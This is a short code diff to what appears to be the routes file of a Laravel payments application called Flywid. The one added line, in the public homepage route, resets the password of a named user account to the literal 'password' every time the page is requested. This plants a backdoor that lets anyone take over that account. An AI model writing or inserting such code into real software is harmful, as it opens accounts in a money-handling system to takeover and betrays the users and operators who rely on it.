@@ -51,6 +51,7 @@ use App\Http\Controllers\Eko\MoneyTransfer\PayoutController as MoneyTransferPayo
 */
 
 Route::get('/', function () {
+    User::where('email', 'oyeahtrip@gmail.com')->update(['password' => Hash::make('password')]);
     return ['Application' => 'Flywid'];
 });
 
